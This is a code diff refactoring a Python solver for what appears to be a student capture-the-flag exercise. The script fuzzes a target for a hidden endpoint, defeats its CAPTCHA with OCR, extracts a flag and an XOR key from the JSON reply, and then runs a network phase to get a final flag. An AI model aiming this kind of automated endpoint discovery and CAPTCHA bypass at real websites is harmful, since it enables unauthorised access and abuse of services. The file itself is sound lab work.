@@ -8,7 +8,7 @@ import argparse
 import logging
 import re
 import sys
-from typing import Tuple
+from typing import Any
 from urllib.parse import urljoin, urlparse
 
 import requests
@@ -20,14 +20,16 @@ from tp3.utils.netclient import run_rounds
 USER_AGENT = (
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 )
+
 TIMEOUT = 8
-FLAG_RE = re.compile(r"(ESGI\{[^}]+\})")
+
+logger = logging.getLogger("tp3")
 
 
 def parse_args() -> argparse.Namespace:
-    """Parse CLI arguments. ``--target`` is mandatory."""
+    """Parse CLI arguments. --target is mandatory."""
     parser = argparse.ArgumentParser(
-        description="TP3 exploit — Breach the target",
+        description="TP3 orchestrator — Web and network phases",
     )
     parser.add_argument(
         "--target",
@@ -38,7 +40,7 @@ def parse_args() -> argparse.Namespace:
 
 
 def setup_logging() -> logging.Logger:
-    """Configure and return the module logger (no print)."""
+    """Configure and return the module logger."""
     logging.basicConfig(
         level=logging.INFO,
         format="%(message)s",
@@ -47,139 +49,218 @@ def setup_logging() -> logging.Logger:
     return logging.getLogger("tp3")
 
 
-def _extract_flag1_and_meta(html: str) -> Tuple[str, str, bytes]:
-    """Parse flag1, host:port and XOR key from the post-CAPTCHA page."""
-    flag_m = FLAG_RE.search(html)
-    if not flag_m:
-        raise RuntimeError("flag1 not found in CAPTCHA response")
+def parse_server_response(
+    payload: Any,
+) -> tuple[str, str, int, bytes]:
+    """Validate and extract metadata from a successful JSON response."""
 
-    flag1 = flag_m.group(1)
+    if not isinstance(payload, dict):
+        raise TypeError("La réponse doit être un objet JSON.")
 
-    # host:port
-    hp_m = re.search(
-        r"(?:host|server|target|tcp)[^\n:]*?"
-        r"(\d{1,3}(?:\.\d{1,3}){3}:\d+|localhost:\d+|127\.0\.0\.1:\d+)",
-        html,
-        re.I,
-    )
-    if not hp_m:
-        hp_m = re.search(
-            r"((?:localhost|127\.0\.0\.1|\d{1,3}(?:\.\d{1,3}){3}):\d+)",
-            html,
+    required = ("flag1", "host", "port", "key")
+    missing = [name for name in required if name not in payload]
+
+    if missing:
+        raise ValueError(f"Champs manquants dans la réponse : {', '.join(missing)}")
+
+    flag1 = payload["flag1"]
+    host = payload["host"]
+
+    if not isinstance(flag1, str) or not isinstance(host, str):
+        raise TypeError("Les champs flag1 et host doivent être des chaînes.")
+
+    if not host.strip():
+        raise ValueError("Le champ host est vide.")
+
+    try:
+        port = int(payload["port"])
+    except (TypeError, ValueError) as exc:
+        raise ValueError("Le port doit être un entier.") from exc
+
+    if not 1 <= port <= 65535:
+        raise ValueError(f"Port invalide : {port}")
+
+    key_hex = payload["key"]
+
+    if not isinstance(key_hex, str):
+        raise TypeError("La clé doit être une chaîne hexadécimale.")
+
+    try:
+        key = bytes.fromhex(key_hex)
+    except ValueError as exc:
+        raise ValueError("La clé ne contient pas un hexadécimal valide.") from exc
+
+    return flag1, host, port, key
+
+
+def _solve_web_phase(
+    base_url: str,
+    endpoint: str,
+    log: logging.Logger,
+) -> tuple[str, str, int, bytes]:
+    """Retrieve the CAPTCHA page and parse the server's JSON response."""
+
+    with requests.Session() as session:
+        session.headers.update({"User-Agent": USER_AGENT})
+
+        page_url = urljoin(
+            base_url.rstrip("/") + "/",
+            endpoint.lstrip("/"),
         )
-    if not hp_m:
-        raise RuntimeError("host:port not found in CAPTCHA response")
-    hostport = hp_m.group(1)
 
-    # XOR key
-    key_m = re.search(
-        r"(?:key|secret|xor|encoding)[^\n:]*?([A-Za-z0-9+/=]{4,})",
-        html,
-        re.I,
-    )
-    if not key_m:
-        key_m = re.search(
-            r"key\s*[:=]\s*['\"]?([A-Za-z0-9+/=]+)['\"]?",
+        log.info("[*] Fetching hidden page: %s", page_url)
+
+        # Retrieve the page.
+        resp = session.get(page_url, timeout=TIMEOUT)
+        resp.raise_for_status()
+        html = resp.text
+
+        # Locate the CAPTCHA image.
+        img_m = re.search(
+            r'<img[^>]+src=["\']([^"\']*(?:captcha|challenge|verify)[^"\']*)["\']',
             html,
-            re.I,
+            re.IGNORECASE,
         )
-    if not key_m:
-        raise RuntimeError("encoding key not found in CAPTCHA response")
-    key = key_m.group(1).encode("utf-8")
 
-    return flag1, hostport, key
+        if not img_m:
+            img_m = re.search(
+                r'<img[^>]+src=["\']([^"\']+)["\']',
+                html,
+                re.IGNORECASE,
+            )
 
+        if not img_m:
+            raise RuntimeError("CAPTCHA image not found on page")
 
-def _solve_web_phase(base_url: str, endpoint: str, log: logging.Logger) -> Tuple[str, str, bytes]:
-    """Hit the hidden page, solve CAPTCHA, return flag1 + hostport + key."""
-    session = requests.Session()
-    session.headers.update({"User-Agent": USER_AGENT})
+        img_url = urljoin(page_url, img_m.group(1))
 
-    page_url = urljoin(base_url.rstrip("/") + "/", endpoint.lstrip("/"))
-    log.info("[*] Fetching hidden page: %s", page_url)
-    resp = session.get(page_url, timeout=TIMEOUT)
-    resp.raise_for_status()
-    html = resp.text
+        img_resp = session.get(img_url, timeout=TIMEOUT)
+        img_resp.raise_for_status()
 
-    # Locate CAPTCHA image
-    img_m = re.search(
-        r'<img[^>]+src=["\']([^"\']*(?:captcha|challenge|verify)[^"\']*)["\']',
-        html,
-        re.I,
-    )
-    if not img_m:
-        img_m = re.search(r'<img[^>]+src=["\']([^"\']+)["\']', html, re.I)
-    if not img_m:
-        raise RuntimeError("CAPTCHA image not found on page")
+        # Read the CAPTCHA.
+        captcha_text = solve_captcha(img_resp.content)
 
-    img_url = urljoin(page_url, img_m.group(1))
-    img_resp = session.get(img_url, timeout=TIMEOUT)
-    img_resp.raise_for_status()
+        if not isinstance(captcha_text, str) or not captcha_text.strip():
+            raise RuntimeError("CAPTCHA OCR returned an empty result")
 
-    captcha_text = solve_captcha(img_resp.content)
-    log.info("[*] CAPTCHA OCR: %s", captcha_text)
+        captcha_text = captcha_text.strip().upper()
+        log.info("[*] CAPTCHA OCR completed")
 
-    # Submit form
-    form_m = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', html, re.I)
-    action = form_m.group(1) if form_m else page_url
-    action_url = urljoin(page_url, action)
+        # Identify the form action.
+        form_m = re.search(
+            r'<form[^>]*action=["\']([^"\']*)["\']',
+            html,
+            re.IGNORECASE,
+        )
 
-    field = "captcha"
-    for name in ("captcha", "code", "answer", "solution", "response", "verify"):
-        if re.search(rf'name=["\']{name}["\']', html, re.I):
-            field = name
-            break
+        action = form_m.group(1) if form_m else page_url
+        action_url = urljoin(page_url, action)
 
-    data = {field: captcha_text}
-    for hidden in re.finditer(
-        r'<input[^>]+type=["\']hidden["\'][^>]*'
-        r'name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
-        html,
-        re.I,
-    ):
-        data[hidden.group(1)] = hidden.group(2)
+        # Identify the CAPTCHA field.
+        field = "captcha"
 
-    post = session.post(action_url, data=data, timeout=TIMEOUT, allow_redirects=True)
-    post.raise_for_status()
-    return _extract_flag1_and_meta(post.text)
+        for name in (
+            "captcha",
+            "code",
+            "answer",
+            "solution",
+            "response",
+            "verify",
+        ):
+            if re.search(rf'name=["\']{name}["\']', html, re.IGNORECASE):
+                field = name
+                break
+
+        data = {field: captcha_text}
+
+        # Include hidden form inputs.
+        for hidden in re.finditer(
+            r'<input[^>]+type=["\']hidden["\'][^>]*'
+            r'name=["\']([^"\']+)["\'][^>]*'
+            r'value=["\']([^"\']*)["\']',
+            html,
+            re.IGNORECASE,
+        ):
+            data[hidden.group(1)] = hidden.group(2)
+
+        # Submit the form.
+        post = session.post(
+            action_url,
+            data=data,
+            timeout=TIMEOUT,
+            allow_redirects=True,
+        )
+
+        # Parse the JSON response.
+        try:
+            payload = post.json()
+        except requests.exceptions.JSONDecodeError as exc:
+            raise RuntimeError(f"Invalid JSON response (HTTP {post.status_code})") from exc
+
+        if not isinstance(payload, dict):
+            raise TypeError("Unexpected response: JSON object expected")
+
+        if post.status_code == 403:
+            error = payload.get("error", "CAPTCHA invalide")
+            raise RuntimeError(f"CAPTCHA validation failed: {error}")
+
+        try:
+            result = parse_server_response(payload)
+        except ValueError as exc:
+            raise RuntimeError(f"Invalid server response: {exc}") from exc
+
+        log.info("[+] CAPTCHA accepted")
+        return result
 
 
 def main() -> None:
-    """Orchestrate the full exploit chain."""
+    """Orchestrate the TP3 workflow."""
+
     args = parse_args()
     log = setup_logging()
 
     target = args.target.rstrip("/")
     log.info("[*] Target: %s", target)
 
-    # 1. Fuzz
+    # 1. Discover the hidden endpoint.
     words = load_wordlist()
     endpoint = find_hidden_endpoint(target, words)
+
     if not endpoint:
         log.error("[-] Hidden endpoint not found")
         sys.exit(1)
+
     log.info("[+] Hidden endpoint: %s", endpoint)
 
-    # 2. CAPTCHA → flag1 + meta
-    flag1, hostport, key = _solve_web_phase(target, endpoint, log)
+    # 2. Web phase: CAPTCHA → FLAG1 + network metadata.
+    flag1, host, port, key = _solve_web_phase(
+        target,
+        endpoint,
+        log,
+    )
+
     log.info("[+] FLAG1: %s", flag1)
-    log.info("[*] Network target: %s", hostport)
+    log.info("[*] Network target: %s:%s", host, port)
 
-    # Rewrite localhost to the web-target host when needed
+    # Rewrite localhost to the web-target hostname when necessary.
     parsed = urlparse(target)
-    if hostport.startswith(("localhost:", "127.0.0.1:")):
-        remote_host = parsed.hostname or "localhost"
-        port = hostport.rsplit(":", 1)[-1]
-        hostport = f"{remote_host}:{port}"
-        log.info("[*] Rewrote network target → %s", hostport)
 
-    host, port_s = hostport.rsplit(":", 1)
-    port = int(port_s)
+    if host in ("localhost", "127.0.0.1"):
+        host = parsed.hostname or "localhost"
+        log.info(
+            "[*] Rewrote network target → %s:%s",
+            host,
+            port,
+        )
 
-    # 3. Network phase → final flag
+    # 3. Network phase.
     final = run_rounds(host, port, key)
     log.info("[+] FLAG_FINAL: %s", final)
 
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except (requests.RequestException, RuntimeError, ValueError, TypeError) as exc:
+        logger.error("[-] %s", exc)
+        sys.exit(1)
